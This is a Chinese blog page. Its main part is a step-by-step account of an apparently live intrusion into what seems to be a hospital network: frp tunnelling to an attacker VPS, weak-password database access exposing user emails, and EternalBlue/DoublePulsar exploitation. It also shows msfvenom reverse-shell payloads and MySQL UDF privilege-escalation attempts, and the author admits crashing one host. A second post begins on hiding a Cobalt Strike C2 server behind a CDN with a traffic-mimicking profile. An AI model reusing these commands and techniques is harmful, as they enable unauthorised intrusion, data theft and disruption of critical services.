<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215121812.png" alt="image-20230213215121812"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215136148.png" alt="image-20230213215136148"></p>
<p>那其他网段我们暂且不看，我们看看1这个网段的机器。</p>
<p>而且经过观察还可以发现，一共有3个域<code>WORKGROUP,MYGROUP,__MSBROWSE__</code></p>
<p>然后我们把这些机器的ip导到txt中，穿上去再用fscan扫一遍</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215826502.png" alt="image-20230213215826502"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -hf ta.txt -o all.txt</span><br></pre></td></tr></table></figure>

<p>大概扫描结果如下</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213224256897.png" alt="image-20230213224256897"></p>
<p>二十多台机器，我觉得有两种可能，一种是医院是小医院，一种是这个网里面只有他们对外的服务，没有内部办公电脑。因为我看了一下内部url的title有什么放射学信息系统，还有些其他的，</p>
<h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>首先我们需要将流量代理出来</p>
<p>我们采用frp，先把frpc传到对面这台机器上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的攻击机</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"># 启用加密，防止流量被拦截</span><br><span class="line">use_encryption = true</span><br><span class="line"># 启用压缩，提升流量转发速度</span><br><span class="line">use_compression = true</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>

<p><code>./frpc -c frpc.ini</code>开启服务</p>
<p>然后自己的vps上，也传个frps上去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vps_ip</span><br><span class="line">server_port = 4444</span><br></pre></td></tr></table></figure>

<p><code>./frps -c frps.ini</code>开启服务，注意现在的socket代理的ip为vps，但是端口为1080</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011120522.png" alt="image-20230214011120522"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011226576.png" alt="image-20230214011226576"></p>
<p>搭建成功！</p>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>一共探测到3个数据库</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120834713.png" alt="image-20230214120834713"></p>
<p>其中两个是有弱口令的，而78这台机器，提示如下，我们可以拿下其他机器之后再来试试</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120725755.png" alt="image-20230214120725755"></p>
<p>另外两个数据，我们是可以直接用fscan扫出来的弱口令登录的。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120934733.png" alt="image-20230214120934733"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121014276.png" alt="image-20230214121014276"></p>
<p>可以发现里面还是有很多数据的</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121120392.png" alt="image-20230214121120392"></p>
<p>只不过密码被加密了，但是却有邮箱等信息</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121203058.png" alt="image-20230214121203058"></p>
<p>都是法语看不太懂</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121416784.png" alt="image-20230214121416784"></p>
<h3 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h3><h4 id="尝试1-1"><a href="#尝试1-1" class="headerlink" title="尝试1"></a>尝试1</h4><p>先给各个机器扫了下弱口令</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214132424369.png" alt="image-20230214132424369"></p>
<p>可惜登录不上，原因未知</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214122437992.png" alt="image-20230214122437992"></p>
<p>先拿下这几台ms17-010好吧</p>
<p>先给kali连上我们的隧道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">改好下方的代理地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.1.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214152912193.png" alt="image-20230214152912193"></p>
<p>但是没有成功返回会话，或许是win5的原因，我们先攻击那台win7的机器。</p>
<p><code>192.168.1.51</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214153404421.png" alt="image-20230214153404421"></p>
<p>等待利用成功。很好，又失败了，<code>Exploit completed, but no session was created.</code></p>
<p>推测目标机器不出网，使用<code>set payload windows/x64/meterpreter/bind_tcp</code>这个paload正向打</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217225542792.png" alt="image-20230217225542792"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line"></span><br><span class="line">目标出网时反向打：</span><br><span class="line">msf &gt; set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line"></span><br><span class="line">目标不出网时正向打（如添加了路由）：</span><br><span class="line">msf &gt; set payload windows/x64/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>

<p>但是同样没有shell弹回来。</p>
<p>==================分割线================================</p>
<p>后续我们采用这个脚本打，实战成功率高。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/projectboot/EternalPuls</span><br></pre></td></tr></table></figure>

<p>这里我们先给msf加一个路由,先把外网的weblinux主机弹一个会话到我们的kali上。</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=你的穿透 LPORT=你的穿透 -f elf &gt; shell.elf</code></p>
<p>将生成的木马传上去，然后kali开启监听。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.32.108</span><br><span class="line">set lport 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后执行木马（记得给执行权限），成功上线msf</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217233610003.png" alt="image-20230217233610003"></p>
<p>添加路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.1.70/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p>开启流量代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">set srvhost 192.168.32.108</span><br><span class="line">set srvport 10011</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后在proxychains中配置好刚才的代理</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234742108.png" alt="image-20230217234742108"></p>
<p>攻击机上也做好代理，可以把原来的frp代理替换掉</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234855406.png" alt="image-20230217234855406"></p>
<p>然后就可以用脚本开始打了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 目标IP --TargetPort 445</span><br><span class="line"></span><br><span class="line">Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 192.168.1.51 --TargetPort 445</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217235008559.png" alt="image-20230217235008559"></p>
<p>64位，用msf生成64位的正向payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1125 -f dll -o bind.dll</span><br></pre></td></tr></table></figure>

<p>然后就可以用脚本直接打了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 目标ip --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload dll地址 --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span><br></pre></td></tr></table></figure>

<p><code>Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.1.51 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload bind.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</code></p>
<p>kali再开一个挂代理的msf,正向连接我们注入的木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.1.51</span><br><span class="line">set lport 1125</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>（这里我应该是把51打蓝屏了，现在51探测不到了。）</p>
<h4 id="尝试2-1"><a href="#尝试2-1" class="headerlink" title="尝试2"></a>尝试2</h4><p>随后想到拿下了两个数据库，可以尝试udf</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172207850.png" alt="image-20230215172207850"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172222517.png" alt="image-20230215172222517"></p>
<p>先查看了一下，mysql是有写入权限的。</p>
<p><code>show global variables like &#39;%secure%&#39;;</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172336987.png" alt="image-20230215172336987"></p>
<p><code>select version();</code>查看当前mysql版本</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172723491.png" alt="image-20230215172723491"></p>
<p>版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。</p>
<p><code>show variables like &#39;plugin%&#39;;</code>查看插件位置，有可能实际并不存在这个文件夹，但是会显示出来。所以我们并不知道是否存在这个目录，只能姑且尝试一下。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215173704248.png" alt="image-20230215173704248"></p>
<p>通过如下命令查看当前机器的系统架构</p>
<p><code>select @@version_compile_os, @@version_compile_machine;</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215174039550.png" alt="image-20230215174039550"></p>
<p>很奇怪啊，fscan扫出来是win，而mysql查询出来却是linux。（本来想的是拿一台win的机器横向方便点。）</p>
<p>接下来我们去sqlmap内置里面找dll文件，路径如下:<code>sqlmap-master\data\udf\mysql</code></p>
<p>这台机器是linux64位，那我们就用64位的机器。</p>
<p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。这里如果后缀名不为.so_或dll_的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。这里sqlmap也自带了解码的py脚本，在<code>/extra/cloak</code>目录下，使用cloak.py解密即可。解密命令如下，</p>
<p><code>python cloak.py -d -i lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;你的地址&#x27;)) into dumpfile &#x27;对面的地址&#x27;;</span><br><span class="line">#ps：这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure>

<p>但是有时候这一步的写入步骤只会写入一部分的内容，导致接下来的步骤都失败，所以也可以直接写入十六进制数据，详见：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
<p>执行，</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180547553.png" alt="image-20230215180547553"></p>
<p>可能目录不存在mysql写入的权限。经过下面使用ntfs的特性写入文件得知，文件夹确实是存在的。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180027818.png" alt="image-20230215180027818"></p>
<p>而写入如下目录的文件却不可以写进去</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180703617.png" alt="image-20230215180703617"></p>
<p>也就是说，这个目录不存在mysql写入的权限。udf宣告失败。</p>
<p>但是可以往tmp写东西</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180812102.png" alt="image-20230215180812102"></p>
<p>那么我们能不能尝试写入密钥（多半不可能，毕竟是root权限的目录）</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215181730240.png" alt="image-20230215181730240"></p>
<p>好，还是不可能。另一台机器我也尝试过，无法写入。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实战内网的经验有些许不足，导致目标蓝屏，无法进一步扩展。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/" class="post-title-link" itemprop="url">c2服务器CDN隐藏</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-03 19:22:04 / 修改时间：19:22:42" itemprop="dateCreated datePublished" datetime="2023-03-03T19:22:04+08:00">2023-03-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="c2服务器CDN隐藏"><a href="#c2服务器CDN隐藏" class="headerlink" title="c2服务器CDN隐藏"></a>c2服务器CDN隐藏</h1><h1 id="配置CDN"><a href="#配置CDN" class="headerlink" title="配置CDN"></a>配置CDN</h1><p>域名注册：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">随便找一个可以注册域名的地方，我用的是阿里云。</span><br></pre></td></tr></table></figure>

<p>cloudflare 免费CDN：</p>
<p><a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/">https://www.cloudflare.com/zh-cn/</a></p>
<p>在GoDaddy购买一个域名后，在Cloudflare处添加站点，将域名填写进去</p>
<p>随后添加一个dns记录</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302110410218.png" alt="image-20230302110410218"></p>
<p>然后需要把域名的dns改成cloudfare提供的dns服务器</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302110544262.png" alt="image-20230302110544262"></p>
<p>修改好域名的dns服务器之后，需要在cdn上面的缓存设置上修改这两个配置，把他们全部打开。</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302111615452.png" alt="image-20230302111615452"></p>
<p>把这个设置成灵活</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302111646403.png" alt="image-20230302111646403"></p>
<p>尝试多地ping</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302112024958.png" alt="image-20230302112024958"></p>
<p>不戳</p>
<h1 id="配置cs-profile文件"><a href="#配置cs-profile文件" class="headerlink" title="配置cs profile文件"></a>配置cs profile文件</h1><p>profile文件的模板,需要把3处的host头修改为我们的域名，然后保存为porfile文件，上传到cs目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">## Amazon browsing traffic profile# # Author: @harmj0y#set sleeptime &quot;5000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;    set uri &quot;/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token=&quot;;</span><br><span class="line">            prepend &quot;skin=noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;    </span><br><span class="line">    set uri &quot;/N4215/adj/amzn.us.sr.aps&quot;;</span><br><span class="line"></span><br><span class="line">    client 